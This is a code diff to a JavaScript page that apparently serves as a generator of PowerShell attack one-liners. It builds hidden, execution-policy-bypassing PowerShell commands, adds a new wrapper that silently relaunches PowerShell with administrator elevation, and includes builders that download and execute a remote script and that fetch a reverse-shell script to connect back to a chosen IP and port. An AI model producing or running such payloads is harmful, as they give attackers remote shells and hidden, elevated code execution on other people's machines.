@@ -1,8 +1,8 @@
 let results = document.getElementById("results");
 
-const wrap = text => `powershell -nop -noni -W hidden -Exec Bypass -c "${text}"`;
-const debugwrap = text => `powershell "${text}"`;
-
+const wrap = text => `powershell -w hidden -exec bypass "${text}"`;
+const debugwrap = text => `powershell -noexit "${text}"`;
+const admin = (script) => `powershell -w hidden -exec bypass  "start -v runas -window hidden powershell '${script.replace(/'/g,`''`)}'"`;
 
 const custom = (url) => `IEX (New-Object Net.WebClient).DownloadString('${url}')`;
 const powercat = (ip, port, command) => `IEX (IWR https://raw.githubusercontent.com/discapes/reverse-powershell/master/epiclion.ps1 -UseBasicParsing); epiclion -c ${ip} -p ${port} -e ${command}`;
@@ -37,13 +37,16 @@ function generate() {
     }
     switch (wrapperType) {
         case "nowrapper":
-            results.innerText = script;
+            results.value = script;
             break;
         case "wrapper":
-            results.innerText = wrap(script);
+            results.value = wrap(script);
             break;
         case "debugwrapper":
-            results.innerText = debugwrap(script);
+            results.value = debugwrap(script);
+            break;
+        case "admin":
+            results.value = admin(script);
             break;
     }
 }
